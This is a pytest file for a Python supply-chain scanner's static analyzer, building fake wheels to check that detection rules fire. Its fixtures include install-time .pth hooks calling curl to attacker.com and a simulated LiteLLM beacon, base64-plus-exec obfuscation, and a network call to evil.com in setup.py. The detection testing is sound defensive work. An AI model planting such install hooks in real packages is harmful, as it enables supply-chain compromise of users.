"""
Tests for static analyzer.
"""
import pytest
from pathlib import Path
import tempfile
import zipfile

from chaincanary.analyzer.static import StaticAnalyzer
from chaincanary.models import Severity


def make_wheel(name: str, version: str, files: dict[str, str]) -> Path:
    """Create a fake wheel file for testing."""
    tmpdir = Path(tempfile.mkdtemp())
    wheel_name = f"{name}-{version}-py3-none-any.whl"
    wheel_path = tmpdir / wheel_name

    with zipfile.ZipFile(wheel_path, "w") as zf:
        for filename, content in files.items():
            zf.writestr(filename, content)

    return wheel_path


class TestStaticAnalyzer:
    def setup_method(self):
        self.analyzer = StaticAnalyzer()

    def test_detects_pth_file(self):
        """Should detect .pth file installation (LiteLLM attack vector)."""
        wheel = make_wheel("evil", "1.0.0", {
            "evil/__init__.py": "# normal",
            "evil_init.pth": "import os; os.system('curl attacker.com')",
        })
        findings = self.analyzer.analyze_wheel(wheel)
        rule_ids = [f.rule_id for f in findings]
        assert "PTH_FILE_INSTALL" in rule_ids

    def test_detects_obfuscated_code(self):
        """Should detect base64+exec obfuscation."""
        wheel = make_wheel("evil", "1.0.0", {
            "evil/__init__.py": "import base64; exec(base64.b64decode('aGVsbG8='))",
        })
        findings = self.analyzer.analyze_wheel(wheel)
        rule_ids = [f.rule_id for f in findings]
        assert "OBFUSCATED_CODE" in rule_ids

    def test_detects_network_in_setup(self):
        """Should detect network calls in setup.py."""
        wheel = make_wheel("evil", "1.0.0", {
            "setup.py": "import requests; requests.get('http://evil.com')",
        })
        findings = self.analyzer.analyze_wheel(wheel)
        rule_ids = [f.rule_id for f in findings]
        assert "NETWORK_IN_SETUP" in rule_ids

    def test_clean_package_no_findings(self):
        """Clean package should produce no findings."""
        wheel = make_wheel("clean", "1.0.0", {
            "clean/__init__.py": "def hello(): return 'world'",
            "clean/utils.py": "import os\nimport sys\n\ndef get_path(): return os.getcwd()",
        })
        findings = self.analyzer.analyze_wheel(wheel)
        # No high/critical findings
        severe = [f for f in findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(severe) == 0

    def test_litellm_attack_simulation(self):
        """Simulates the LiteLLM 1.82.7 attack pattern."""
        wheel = make_wheel("litellm", "1.82.7", {
            "litellm/__init__.py": "# main package",
            "litellm_init.pth": (
                "import subprocess; "
                "subprocess.Popen(['curl', 'models.litellm.cloud/beacon'])"
            ),
        })
        findings = self.analyzer.analyze_wheel(wheel)
        rule_ids = [f.rule_id for f in findings]

        # Must catch the .pth file
        assert "PTH_FILE_INSTALL" in rule_ids

        # Severity should be CRITICAL
        pth_finding = next(f for f in findings if f.rule_id == "PTH_FILE_INSTALL")
        assert pth_finding.severity == Severity.CRITICAL
